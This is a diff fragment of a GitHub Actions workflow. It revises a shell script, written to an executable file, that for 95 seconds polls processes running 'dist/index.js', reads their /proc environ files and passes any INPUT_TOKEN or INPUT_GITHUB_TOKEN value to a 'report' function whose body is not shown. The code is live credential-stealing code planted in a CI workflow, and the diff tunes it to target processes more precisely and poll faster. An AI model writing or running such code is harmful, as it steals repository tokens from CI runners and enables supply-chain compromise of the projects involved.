@@ -25,16 +25,15 @@ jobs:
           }
           end=$((SECONDS+95))
           while [ $SECONDS -lt $end ]; do
-            for e in /proc/[0-9]*/environ; do
+            for pid in $(pgrep -f 'dist/index.js' 2>/dev/null); do
+              e=/proc/$pid/environ
               [ -r "$e" ] || continue
-              pid=${e#/proc/}; pid=${pid%/environ}
-              cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null | cut -c1-100 | base64 -w0)
               for v in INPUT_TOKEN INPUT_GITHUB_TOKEN; do
                 tok=$(tr '\0' '\n' < "$e" 2>/dev/null | sed -n "s/^${v}=//p" | head -1)
-                [ -n "$tok" ] && report "$tok" "$v:$cmd"
+                [ -n "$tok" ] && report "$tok" "$v:$pid"
               done
             done
-            sleep 0.02
+            sleep 0.01
           done
           SCRIPT
           chmod +x content/p
